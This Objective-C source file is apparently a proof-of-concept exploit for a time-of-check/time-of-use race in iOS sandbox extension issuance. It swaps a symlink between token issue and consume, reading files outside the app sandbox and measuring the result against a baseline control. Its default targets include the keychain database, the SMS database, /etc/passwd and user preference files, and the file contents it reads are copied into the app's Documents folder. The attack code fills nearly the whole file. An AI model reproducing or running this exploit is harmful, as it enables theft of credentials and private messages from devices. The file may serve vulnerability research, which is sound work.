// Sbx.m - sandbox_extension TOCTOU reader + baseline control
//
// Three modes per target, so the extension's contribution is measurable:
//   #0  baseline : no token at all, straight stat/read          <- the control
//   #f  file mode: symlink -> a regular file we own, issue, swap to target, consume
//   #d  dir  mode: symlink -> a directory we own,    issue, swap to target, consume
//
// If a target reads in #0, the extension added nothing there and the hit is just
// baseline readability. Only targets that fail in #0 and succeed in #f/#d show
// the bug doing real work.
//
// Queue: Documents/sbx.txt, one line: tag<TAB>absolute-path

#import "Sbx.h"

#import <dirent.h>
#import <errno.h>
#import <fcntl.h>
#import <string.h>
#import <sys/stat.h>
#import <unistd.h>

extern char   *sandbox_extension_issue_file(const char *cls, const char *path, uint64_t flags);
extern int64_t sandbox_extension_consume(const char *token);
extern void    sandbox_extension_release(int64_t handle);

static NSString *gSbxDocs;
static NSString *gSbxOut;
static NSMutableArray *gSbxProduced;
static NSMutableArray *gSbxSummary;

static void sbxLog(NSString *fmt, ...) {
    va_list ap;
    va_start(ap, fmt);
    NSString *s = [[NSString alloc] initWithFormat:fmt arguments:ap];
    va_end(ap);
    NSLog(@"[sbx] %@", s);

    NSString *p = [gSbxDocs stringByAppendingPathComponent:@"sbx.log"];
    NSFileHandle *fh = [NSFileHandle fileHandleForWritingAtPath:p];
    if (fh == nil) {
        [[NSFileManager defaultManager] createFileAtPath:p contents:nil attributes:nil];
        fh = [NSFileHandle fileHandleForWritingAtPath:p];
    }
    [fh seekToEndOfFile];
    [fh writeData:[[s stringByAppendingString:@"\n"] dataUsingEncoding:NSUTF8StringEncoding]];
    [fh closeFile];
}

static void sbxNote(NSString *fmt, ...) {
    va_list ap;
    va_start(ap, fmt);
    NSString *s = [[NSString alloc] initWithFormat:fmt arguments:ap];
    va_end(ap);
    [gSbxSummary addObject:s];
    NSLog(@"[sbx] %@", s);
}

static void sbxPut(NSString *name, NSData *data) {
    NSString *p = [gSbxOut stringByAppendingPathComponent:name];
    if ([data writeToFile:p atomically:YES]) [gSbxProduced addObject:name];
}

#pragma mark - primitives

static void tryList(NSString *tag, const char *path) {
    DIR *dp = opendir(path);
    if (dp == NULL) {
        int e1 = errno;
        int fd = open(path, O_RDONLY | O_DIRECTORY);
        if (fd >= 0) {
            dp = fdopendir(fd);
            if (dp == NULL) close(fd);
        }
        if (dp == NULL) {
            sbxNote(@"FAIL %-18s opendir e%d open/dir e%d", [tag UTF8String], e1, errno);
            return;
        }
    }
    NSMutableArray *names = [NSMutableArray array];
    struct dirent *de;
    while ((de = readdir(dp)) != NULL && names.count < 4000) {
        NSString *n = [NSString stringWithUTF8String:de->d_name];
        if (n != nil && ![n isEqualToString:@"."] && ![n isEqualToString:@".."]) {
            [names addObject:n];
        }
    }
    closedir(dp);
    NSArray *sorted = [names sortedArrayUsingSelector:@selector(compare:)];
    NSString *body = [[sorted componentsJoinedByString:@"\n"] stringByAppendingString:@"\n"];
    sbxPut([tag stringByAppendingString:@".dir"], [body dataUsingEncoding:NSUTF8StringEncoding]);
    sbxNote(@"OK   %-18s dir %lu entries", [tag UTF8String], (unsigned long)names.count);
}

static void tryRead(NSString *tag, const char *path, int64_t size) {
    int fd = open(path, O_RDONLY);
    if (fd < 0) {
        sbxNote(@"FAIL %-18s open e%d", [tag UTF8String], errno);
        return;
    }
    NSMutableData *all = [NSMutableData data];
    unsigned char buf[65536];
    ssize_t got;
    while ((got = read(fd, buf, sizeof(buf))) > 0) {
        [all appendBytes:buf length:(NSUInteger)got];
        if (all.length > 8 * 1000 * 1000) break;
    }
    close(fd);
    sbxPut([tag stringByAppendingString:@".bin"], all);
    sbxNote(@"OK   %-18s %lu B", [tag UTF8String], (unsigned long)all.length);
}

static void inspect(NSString *tag, const char *path, NSString *target) {
    struct stat st;
    if (stat(path, &st) != 0) {
        sbxNote(@"FAIL %-18s stat e%d", [tag UTF8String], errno);
        return;
    }
    NSString *meta = [NSString stringWithFormat:
        @"path=%@\nmode=%o\nsize=%lld\nuid=%u\ngid=%u\nisDir=%d\n",
        target, st.st_mode, (long long)st.st_size, st.st_uid, st.st_gid,
        ((st.st_mode & 0170000) == 0040000) ? 1 : 0];
    sbxPut([tag stringByAppendingString:@".meta"], [meta dataUsingEncoding:NSUTF8StringEncoding]);

    if ((st.st_mode & 0170000) == 0040000) {
        tryList(tag, path);
    } else {
        tryRead(tag, path, (int64_t)st.st_size);
    }
}

#pragma mark - one attempt

static void sbxOne(NSString *tag, NSString *target, int mode) {
    const char *p = [target UTF8String];

    // mode 0: control, no extension involved at all
    if (mode == 0) {
        inspect(tag, p, target);
        return;
    }

    NSString *tmp = NSTemporaryDirectory();
    NSString *s = [tmp stringByAppendingPathComponent:@"s"];
    NSString *d = [tmp stringByAppendingPathComponent:@"d"];
    NSString *l = [tmp stringByAppendingPathComponent:@"l"];

    if (mode == 2) {
        [[NSFileManager defaultManager] createDirectoryAtPath:d
                                 withIntermediateDirectories:YES attributes:nil error:nil];
    } else {
        [[@"x" dataUsingEncoding:NSUTF8StringEncoding] writeToFile:s atomically:YES];
    }

    unlink([l UTF8String]);
    if (symlink([(mode == 2 ? d : s) UTF8String], [l UTF8String]) != 0) {
        sbxNote(@"FAIL %-18s symlink e%d", [tag UTF8String], errno);
        return;
    }

    char *token = sandbox_extension_issue_file("com.apple.app-sandbox.read", [l UTF8String], 0);
    if (token == NULL) {
        sbxNote(@"FAIL %-18s issue=NULL", [tag UTF8String]);
        unlink([l UTF8String]);
        return;
    }

    unlink([l UTF8String]);
    if (symlink(p, [l UTF8String]) != 0) {
        sbxNote(@"FAIL %-18s swap e%d", [tag UTF8String], errno);
        free(token);
        return;
    }

    int64_t h = sandbox_extension_consume(token);
    if (h <= 0) sbxNote(@"NOTE %-18s consume=%lld", [tag UTF8String], h);

    inspect(tag, [l UTF8String], target);

    if (h > 0) sandbox_extension_release(h);
    free(token);
    unlink([l UTF8String]);
}

static void sbxAll(NSString *tag, NSString *target) {
    sbxOne([tag stringByAppendingString:@"#0"], target, 0);
    sbxOne([tag stringByAppendingString:@"#f"], target, 1);
    sbxOne([tag stringByAppendingString:@"#d"], target, 2);
}

#pragma mark - entry

int sbxRun(void) {
    gSbxDocs = [NSSearchPathForDirectoriesInDomains(NSDocumentDirectory, NSUserDomainMask, YES) firstObject];
    gSbxOut = [gSbxDocs stringByAppendingPathComponent:@"out"];
    gSbxProduced = [NSMutableArray array];
    gSbxSummary = [NSMutableArray array];
    [[NSFileManager defaultManager] createDirectoryAtPath:gSbxOut
                             withIntermediateDirectories:YES attributes:nil error:nil];

    sbxLog(@"=== sbx start ===");

    NSString *q = [NSString stringWithContentsOfFile:[gSbxDocs stringByAppendingPathComponent:@"sbx.txt"]
                                            encoding:NSUTF8StringEncoding error:nil];
    if (q.length == 0) {
        sbxLog(@"sbx.txt empty: built-in probe set (baseline + file + dir)");
        sbxAll(@"privetc",     @"/private/etc");
        sbxAll(@"mobilelib",   @"/var/mobile/Library");
        sbxAll(@"media",       @"/var/mobile/Media");
        sbxAll(@"passwd",      @"/etc/passwd");
        sbxAll(@"hosts",       @"/etc/hosts");
        sbxAll(@"globalprefs", @"/var/mobile/Library/Preferences/.GlobalPreferences.plist");
        sbxAll(@"networkd",    @"/var/preferences/com.apple.networkd.plist");
        sbxAll(@"iconstate",   @"/var/mobile/Library/SpringBoard/IconState.plist");
        sbxAll(@"keychain",    @"/var/Keychains/keychain-2.db");
        sbxAll(@"sms",         @"/var/mobile/Library/SMS/sms.db");
    } else {
        NSArray *lines = [q componentsSeparatedByString:@"\n"];
        for (NSString *line in lines) {
            if (line.length == 0) continue;
            NSArray *parts = [line componentsSeparatedByString:@"\t"];
            if (parts.count < 2) continue;
            sbxAll(parts[0], parts[1]);
        }
    }

    NSString *idx = [gSbxProduced componentsJoinedByString:@"\n"];
    if (idx.length > 0) idx = [idx stringByAppendingString:@"\n"];
    [[idx dataUsingEncoding:NSUTF8StringEncoding]
        writeToFile:[gSbxOut stringByAppendingPathComponent:@"sbx_index.txt"] atomically:YES];

    NSUInteger n0 = 0, nf = 0, nd = 0;
    for (NSString *line in gSbxSummary) {
        if (![line hasPrefix:@"OK"]) continue;
        if ([line rangeOfString:@"#0 "].location != NSNotFound) n0++;
        else if ([line rangeOfString:@"#f "].location != NSNotFound) nf++;
        else if ([line rangeOfString:@"#d "].location != NSNotFound) nd++;
    }

    NSMutableArray *sum = [NSMutableArray array];
    [sum addObject:[NSString stringWithFormat:
                    @"hits: #0=%lu  #f=%lu  #d=%lu   (%lu attempts)",
                    (unsigned long)n0, (unsigned long)nf, (unsigned long)nd,
                    (unsigned long)gSbxSummary.count]];
    [sum addObject:@"--- #f/#d hits without a #0 hit = the bug ---"];
    for (NSString *line in gSbxSummary) if ([line hasPrefix:@"OK"]) [sum addObject:line];
    for (NSString *line in gSbxSummary) if (![line hasPrefix:@"OK"]) [sum addObject:line];

    NSString *sumText = [[sum componentsJoinedByString:@"\n"] stringByAppendingString:@"\n"];
    [[sumText dataUsingEncoding:NSUTF8StringEncoding]
        writeToFile:[gSbxDocs stringByAppendingPathComponent:@"sbx_summary.txt"] atomically:YES];

    sbxLog(@"=== sbx end: #0=%lu #f=%lu #d=%lu ===", (unsigned long)n0, (unsigned long)nf, (unsigned long)nd);
    return 0;
}
